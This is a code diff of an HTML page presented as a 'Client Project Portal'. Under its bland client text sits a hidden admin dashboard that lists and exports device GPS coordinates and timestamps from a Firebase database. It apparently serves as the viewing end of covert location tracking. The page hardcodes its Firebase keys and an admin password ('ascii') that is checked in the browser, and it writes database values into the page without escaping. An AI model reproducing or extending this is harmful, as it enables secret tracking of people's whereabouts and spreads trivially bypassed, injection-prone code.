@@ -1,187 +1,200 @@
-<!DOCTYPE html><html lang="en">
+<!DOCTYPE html>
+<html lang="en">
 <head>
   <meta charset="UTF-8" />
-  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
   <title>Client Project Portal</title>
-  <script src="https://www.gstatic.com/firebasejs/9.6.10/firebase-app-compat.js"></script>
-  <script src="https://www.gstatic.com/firebasejs/9.6.10/firebase-database-compat.js"></script>
   <style>
     body {
+      font-family: 'Segoe UI', sans-serif;
       margin: 0;
-      font-family: Arial, sans-serif;
-      background: #f4f4f4;
+      padding: 0;
+      background: #f4f4f9;
       color: #333;
     }
-    header {
-      background: #1a202c;
-      color: #fff;
-      padding: 1rem;
-      text-align: center;
-    }
     .container {
-      max-width: 960px;
+      max-width: 900px;
       margin: auto;
-      padding: 1rem;
+      padding: 20px;
     }
     .section {
       background: white;
-      margin-bottom: 1rem;
-      padding: 1rem;
-      border-radius: 6px;
-      box-shadow: 0 2px 6px rgba(0,0,0,0.1);
-      animation: slideIn 0.5s ease-in-out;
+      margin: 20px 0;
+      padding: 20px;
+      border-radius: 10px;
+      box-shadow: 0 2px 8px rgba(0,0,0,0.1);
     }
-    @keyframes slideIn {
-      from { opacity: 0; transform: translateY(20px); }
-      to { opacity: 1; transform: translateY(0); }
+    .section h2 {
+      margin-top: 0;
+      font-size: 1.3em;
+    }
+    #adminPanel {
+      display: none;
+    }
+    input[type="password"] {
+      width: 100%;
+      padding: 10px;
+      margin-top: 10px;
+      margin-bottom: 20px;
+      border-radius: 5px;
+      border: 1px solid #ccc;
+    }
+    button {
+      background: #333;
+      color: white;
+      border: none;
+      padding: 10px 20px;
+      border-radius: 5px;
+      cursor: pointer;
     }
     table {
       width: 100%;
       border-collapse: collapse;
-      margin-top: 1rem;
-    }
-    table, th, td {
-      border: 1px solid #ccc;
+      margin-top: 10px;
     }
     th, td {
-      padding: 0.5rem;
-      text-align: center;
+      padding: 10px;
+      border: 1px solid #ccc;
+      text-align: left;
+      font-size: 0.95em;
     }
-    .hidden-admin {
-      display: none;
+    th {
+      background: #eee;
     }
-    .admin-panel {
-      margin-top: 2rem;
+    #toggleAdminBtn {
+      margin-top: 40px;
+      display: block;
+      background: #222;
     }
-    .btn {
-      background: #2b6cb0;
-      color: white;
-      padding: 0.5rem 1rem;
-      border: none;
-      border-radius: 4px;
-      cursor: pointer;
-    }
-    .btn:hover {
-      background: #2c5282;
-    }
-    input[type="text"] {
-      padding: 0.5rem;
-      width: 60%;
-      margin-bottom: 1rem;
+    #logCount {
+      margin: 10px 0;
     }
   </style>
 </head>
 <body>
-  <header>
-    <h1>Client Project Portal</h1>
-  </header>
-  <div class="container">
-    <div class="section">
-      <h2>Client Requirements</h2>
-      <p>All specifications must be approved and timestamped.</p>
-    </div>
-    <div class="section">
-      <h2>Terms and Review</h2>
-      <p>Final review will be automatically saved and verified upon access.</p>
-    </div>
-    <div class="section">
-      <h2>Legal & Compliance</h2>
-      <p>Ensure full adherence to documentation agreements.</p>
-    </div><div class="admin-panel" id="adminPanel">
-  <h2>Admin Dashboard</h2>
-  <input type="text" id="searchInput" placeholder="Search by device or location..." />
-  <button class="btn" onclick="exportCSV()">Export as CSV</button>
-  <p>Daily logs: <span id="dailyCount">0</span></p>
-  <table>
-    <thead>
-      <tr>
-        <th>Device</th>
-        <th>Latitude</th>
-        <th>Longitude</th>
-        <th>Timestamp</th>
-      </tr>
-    </thead>
-    <tbody id="logTable">
-      <tr><td colspan="4">Loading...</td></tr>
-    </tbody>
-  </table>
+
+<div class="container">
+  <div class="section" id="publicPage">
+    <h2>Client Project Portal</h2>
+    <p><strong>Client Requirements</strong><br/>All specifications must be approved and timestamped.</p>
+    <p><strong>Terms and Review</strong><br/>Final review will be automatically saved and verified upon access.</p>
+    <p><strong>Legal & Compliance</strong><br/>Ensure full adherence to documentation agreements.</p>
+
+    <hr />
+    <p><strong>Admin Dashboard</strong></p>
+    <p>Enter password to access admin panel:</p>
+    <input type="password" id="adminPassword" placeholder="Enter password (e.g. ASCII)" />
+    <button onclick="showAdmin()">Enter</button>
+  </div>
+
+  <div class="section" id="adminPanel">
+    <h2>Admin Dashboard</h2>
+    <p><input type="text" id="searchInput" placeholder="Search by device or location..." style="width:100%; padding:10px;"/></p>
+    <button onclick="exportCSV()">Export as CSV</button>
+    <p id="logCount">Daily logs: 0</p>
+    <table id="logTable">
+      <thead>
+        <tr>
+          <th>Device</th>
+          <th>Latitude</th>
+          <th>Longitude</th>
+          <th>Timestamp</th>
+        </tr>
+      </thead>
+      <tbody>
+        <tr><td colspan="4">Loading...</td></tr>
+      </tbody>
+    </table>
+  </div>
 </div>
 
-  </div>  <script>
-    const firebaseConfig = {
-      apiKey: "AIzaSyCvYA-6_hjcy47NHFCRoVK2JcrmcVKMVKw",
-      authDomain: "gps-d0bab.firebaseapp.com",
-      databaseURL: "https://gps-d0bab-default-rtdb.firebaseio.com",
-      projectId: "gps-d0bab",
-      storageBucket: "gps-d0bab.appspot.com",
-      messagingSenderId: "810816177909",
-      appId: "1:810816177909:web:aad210ebbb87f8d64ce7bc"
-    };
+<!-- Firebase Scripts -->
+<script src="https://www.gstatic.com/firebasejs/8.10.1/firebase-app.js"></script>
+<script src="https://www.gstatic.com/firebasejs/8.10.1/firebase-database.js"></script>
+<script>
+  // Firebase config
+  const firebaseConfig = {
+    apiKey: "AIzaSyCvYA-6_hjcy47NHFCRoVK2JcrmcVKMVKw",
+    authDomain: "gps-d0bab.firebaseapp.com",
+    databaseURL: "https://gps-d0bab-default-rtdb.firebaseio.com",
+    projectId: "gps-d0bab",
+    storageBucket: "gps-d0bab.appspot.com",
+    messagingSenderId: "810816177909",
+    appId: "1:810816177909:web:aad210ebbb87f8d64ce7bc"
+  };
+  firebase.initializeApp(firebaseConfig);
+  const db = firebase.database();
 
-    firebase.initializeApp(firebaseConfig);
-    const db = firebase.database();
+  const tableBody = document.querySelector("#logTable tbody");
+  const logCount = document.getElementById("logCount");
+  const searchInput = document.getElementById("searchInput");
 
-    const tableBody = document.getElementById("logTable");
-    const dailyCountEl = document.getElementById("dailyCount");
-    const searchInput = document.getElementById("searchInput");
-
-    function updateTable(logs) {
-      const searchTerm = searchInput.value.toLowerCase();
-      let html = "";
-      let dailyCount = 0;
-      const today = new Date().toDateString();
-
-      logs.forEach(log => {
-        const date = new Date(log.timestamp);
-        if (date.toDateString() === today) dailyCount++;
-
-        if (
-          log.device.toLowerCase().includes(searchTerm) ||
-          log.latitude.toLowerCase().includes(searchTerm) ||
-          log.longitude.toLowerCase().includes(searchTerm)
-        ) {
-          html += `
-            <tr>
-              <td>${log.device}</td>
-              <td>${log.latitude}</td>
-              <td>${log.longitude}</td>
-              <td>${date.toLocaleString()}</td>
-            </tr>
-          `;
+  // Fetch and display data
+  function loadData() {
+    db.ref("/").on("value", snapshot => {
+      const data = snapshot.val();
+      let rows = "";
+      let count = 0;
+      for (let key in data) {
+        const entry = data[key];
+        if (entry.device && entry.latitude && entry.longitude && entry.timestamp) {
+          const time = new Date(entry.timestamp).toLocaleString();
+          const match = searchInput.value.trim().toLowerCase();
+          if (
+            !match || 
+            (entry.device && entry.device.toLowerCase().includes(match)) || 
+            (entry.latitude && entry.latitude.toString().includes(match)) || 
+            (entry.longitude && entry.longitude.toString().includes(match))
+          ) {
+            rows += `
+              <tr>
+                <td>${entry.device}</td>
+                <td>${entry.latitude}</td>
+                <td>${entry.longitude}</td>
+                <td>${time}</td>
+              </tr>
+            `;
+            count++;
+          }
         }
-      });
+      }
+      tableBody.innerHTML = rows || "<tr><td colspan='4'>No logs found</td></tr>";
+      logCount.textContent = `Daily logs: ${count}`;
+    });
+  }
 
-      tableBody.innerHTML = html || '<tr><td colspan="4">No data found</td></tr>';
-      dailyCountEl.textContent = dailyCount;
+  // Admin panel unlock
+  function showAdmin() {
+    const input = document.getElementById("adminPassword").value.trim();
+    if (input.toLowerCase() === "ascii") {
+      document.getElementById("publicPage").style.display = "none";
+      document.getElementById("adminPanel").style.display = "block";
+      loadData();
+      searchInput.addEventListener("input", loadData);
+    } else {
+      alert("Incorrect password!");
     }
+  }
 
-    function fetchLogs() {
-      db.ref("locations").on("value", (snapshot) => {
-        const logs = [];
-        snapshot.forEach(child => {
-          logs.push(child.val());
-        });
-        updateTable(logs);
-      });
-    }
+  // Export CSV
+  function exportCSV() {
+    let csv = "Device,Latitude,Longitude,Timestamp\n";
+    const rows = document.querySelectorAll("#logTable tbody tr");
+    rows.forEach(row => {
+      const cols = row.querySelectorAll("td");
+      if (cols.length === 4) {
+        csv += `${cols[0].innerText},${cols[1].innerText},${cols[2].innerText},${cols[3].innerText}\n`;
+      }
+    });
+    const blob = new Blob([csv], { type: "text/csv" });
+    const url = window.URL.createObjectURL(blob);
+    const a = document.createElement("a");
+    a.href = url;
+    a.download = "gps_logs.csv";
+    a.click();
+    window.URL.revokeObjectURL(url);
+  }
+</script>
 
-    function exportCSV() {
-      let csv = "Device,Latitude,Longitude,Timestamp\n";
-      const rows = tableBody.querySelectorAll("tr");
-      rows.forEach(row => {
-        const cols = row.querySelectorAll("td");
-        if (cols.length === 4) {
-          csv += `${cols[0].textContent},${cols[1].textContent},${cols[2].textContent},${cols[3].textContent}\n`;
-        }
-      });
-      const blob = new Blob([csv], { type: "text/csv" });
-      const link = document.createElement("a");
-      link.href = URL.createObjectURL(blob);
-      link.download = "logs.csv";
-      link.click();
-    }
-
-    searchInput.addEventListener("input", fetchLogs);
-    window.onload = fetchLogs;
-  </script></body>
+</body>
   </html>
